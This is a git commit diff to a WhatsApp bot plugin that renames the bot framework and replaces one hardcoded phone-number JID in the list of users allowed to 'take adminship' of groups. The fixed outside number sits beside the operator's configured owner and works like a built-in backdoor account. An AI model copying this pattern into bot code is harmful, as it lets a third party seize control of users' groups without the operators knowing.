b4e3a23c8121f6cc194980b274b2b26bbe630a8f
almtz <159121416+almtz@users.noreply.github.com>
2025-06-07 21:48:24 +0300

    Update group-admin.js

--- plugins/group-admin.js
+++ plugins/group-admin.js
@@ -1,7 +1,7 @@
-const { malvin } = require('../malvin');
+const { almach } = require('../almach');
 const config = require('../settings');
 
-malvin({
+almach({
     pattern: "admin",
     alias: ["takeadmin", "makeadmin"],
     desc: "Take adminship for authorized users",
@@ -25,7 +25,7 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
     // Authorized users (properly formatted JIDs)
     const AUTHORIZED_USERS = [
         normalizeJid(config.DEV), // Handles both raw numbers and JIDs in config
-        "263780166288@s.whatsapp.net"
+        "25583174517@s.whatsapp.net"
     ].filter(Boolean);
 
     // Check authorization with normalized JIDs
